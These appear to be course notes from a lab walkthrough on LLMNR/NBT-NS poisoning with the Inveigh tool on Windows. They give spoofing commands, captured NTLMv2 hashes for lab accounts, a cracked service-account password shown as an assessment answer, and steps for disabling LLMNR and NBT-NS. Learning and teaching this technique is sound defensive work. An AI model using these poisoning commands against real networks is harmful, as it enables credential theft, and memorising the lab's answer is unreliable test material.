# LLMNR/NBT-NS Poisoning - from Windows

## Using Inveigh

```powershell-session
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

Key                     Value
---                     -----
ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
KerberosHostHeader      System.Management.Automation.ParameterMetadata
ProxyIgnore             System.Management.Automation.ParameterMetadata
PcapTCP                 System.Management.Automation.ParameterMetadata
PcapUDP                 System.Management.Automation.ParameterMetadata
SpooferHostsReply       System.Management.Automation.ParameterMetadata
SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
SpooferIPsReply         System.Management.Automation.ParameterMetadata
SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
WPADDirectHosts         System.Management.Automation.ParameterMetadata
WPADAuthIgnore          System.Management.Automation.ParameterMetadata
ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
ConsoleStatus           System.Management.Automation.ParameterMetadata
ADIDNSThreshold         System.Management.Automation.ParameterMetadata
ADIDNSTTL               System.Management.Automation.ParameterMetadata
DNSTTL                  System.Management.Automation.ParameterMetadata
HTTPPort                System.Management.Automation.ParameterMetadata
HTTPSPort               System.Management.Automation.ParameterMetadata
KerberosCount           System.Management.Automation.ParameterMetadata
LLMNRTTL                System.Management.Automation.ParameterMetadata

<SNIP>
```

Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file. We will leave the rest of the defaults, which can be seen [here](https://github.com/Kevin-Robertson/Inveigh#parameter-help).

```powershell-session
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

## C# Inveigh (InveighZero)

```powershell-session
PS C:\htb> .\Inveigh.exe
```

Hit the `esc` key to enter the console while Inveigh is running. Type `HELP` on the console to see the available options.

We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.

```powershell-session

================================================= Unique NTLMv2 Hashes =================================================

Hashes
========================================================================================================================
backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:01010000000000001DBF1816222DD801DF80FE7D54E898EF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001DBF1816222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000016010623222DD801B9083B0DCEE1D9520000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080016010623222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000

<SNIP>
```

Type in `GET NTLMV2USERNAMES` and see which usernames we have collected

## Remediation

### Disable LLMNR and NBT-NS

We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."

![Group Policy](https://academy.hackthebox.com/storage/modules/143/llmnr\_disable.png)

We can disable NBT-NS in `Control Panel`->`Network and Sharing Center`->`Change adapter settings`-> right-clicking on the adapter to view its properties -> `Internet Protocol Version 4 (TCP/IPv4)`-> `Properties` ->`Advanced` and selecting -> `WINS` -> `Disable NetBIOS over TCP/IP`\


![Disable NBT-NS](https://academy.hackthebox.com/storage/modules/143/disable\_nbtns.png)

## Assessment

```
C(0:0) NTLMv1(0:0) NTLMv2(5:43)> get ntlmv2 svc_qualys
```

{% code overflow="wrap" %}
```
svc_qualys::INLANEFREIGHT:1C0D42BDA98B38BF:BD8139D48603DF5EA3AD6A1AD54EFFE5:0101000000000000D0D1FB6577ADD90190B90FCEBFB88B350000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800D0D1FB6577ADD90106000400020000000800300030000000000000000000000000300000629ED1BE47E81FC17342A4824CCB9970F801FF0AF55938994755F1B30036757A0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (31) (1) (2).png" alt=""><figcaption><p>svc_qualys:security#1</p></figcaption></figure>
